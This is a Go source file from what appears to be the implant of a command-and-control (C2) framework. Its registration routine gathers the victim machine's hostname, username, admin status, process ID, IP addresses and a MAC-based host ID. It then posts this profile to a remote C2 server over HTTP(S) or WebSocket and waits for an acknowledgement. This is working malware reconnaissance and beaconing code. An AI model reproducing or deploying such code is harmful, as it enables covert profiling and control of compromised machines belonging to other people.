package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
)

// AgentInfo contains system information for registration
type AgentInfo struct {
	Hostname      string   `json:"hostname"`
	OS            string   `json:"os"`
	Architecture  string   `json:"architecture"`
	Username      string   `json:"username"`
	IsAdmin       bool     `json:"is_admin"`
	ProcessID     int      `json:"pid"`
	IPAddresses   []string `json:"ips"`
	Protocol      string   `json:"protocol"`
	ExecutionTime string   `json:"execution_time"`
	HostID        string   `json:"host_id"`
}

// Register sends agent information to C2 server
func (t *Tunnel) Register() error {
	info, err := t.collectSystemInfo()
	if err != nil {
		return fmt.Errorf("failed to collect system info: %v", err)
	}

	switch t.Method {
	case "http", "https":
		return t.sendHTTPRegister(info)
	case "websocket", "websockets":
		return t.sendWSRegister(info)
	default:
		return fmt.Errorf("unsupported protocol for registration")
	}
}

func (t *Tunnel) collectSystemInfo() (*AgentInfo, error) {
	hostname, _ := os.Hostname()
	username := "unknown"
	if user, err := user.Current(); err == nil {
		username = user.Username
	}

	ips := t.getIPAddresses()
	execTime := time.Now().UTC().Format(time.RFC3339)

	return &AgentInfo{
		Hostname:      hostname,
		OS:            runtime.GOOS,
		Architecture:  runtime.GOARCH,
		Username:      username,
		IsAdmin:       isAdmin(),
		ProcessID:     os.Getpid(),
		IPAddresses:   ips,
		Protocol:      t.Method,
		ExecutionTime: execTime,
		HostID:        generateHostID(),
	}, nil
}

func isAdmin() bool {
	if runtime.GOOS == "windows" {
		return isWindowsAdmin()
	}
	return os.Geteuid() == 0
}

func (t *Tunnel) getIPAddresses() []string {
	var ips []string
	ifaces, _ := net.Interfaces()

	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip.IsGlobalUnicast() {
				ips = append(ips, ip.String())
			}
		}
	}
	return ips
}

func generateHostID() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	if len(interfaces) > 0 {
		return fmt.Sprintf("%s-%s", hostname, interfaces[0].HardwareAddr.String())
	}
	return hostname
}

func (t *Tunnel) sendHTTPRegister(info *AgentInfo) error {
	client := &http.Client{Timeout: 10 * time.Second}
	url := fmt.Sprintf("%s://%s:%d/register", t.Method, t.RemoteHost, t.RemotePort)

	jsonData, err := json.Marshal(info)
	if err != nil {
		return err
	}

	resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("registration failed with status: %d", resp.StatusCode)
	}

	if t.EnableDebug {
		log("Registration successful via HTTP(S)")
	}
	return nil
}

func (t *Tunnel) sendWSRegister(info *AgentInfo) error {
	url := fmt.Sprintf("ws://%s:%d/register", t.RemoteHost, t.RemotePort)
	if t.Method == "websockets" {
		url = fmt.Sprintf("wss://%s:%d/register", t.RemoteHost, t.RemotePort)
	}

	conn, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		return err
	}
	defer conn.Close()

	jsonData, err := json.Marshal(info)
	if err != nil {
		return err
	}

	if err := conn.WriteMessage(websocket.TextMessage, jsonData); err != nil {
		return err
	}

	// Wait for confirmation
	_, response, err := conn.ReadMessage()
	if err != nil {
		return err
	}

	if string(response) != "ACK" {
		return fmt.Errorf("registration acknowledgment failed")
	}

	if t.EnableDebug {
		log("Registration successful via WebSocket")
	}
	return nil
}

// Windows admin check (simplified)
func isWindowsAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}
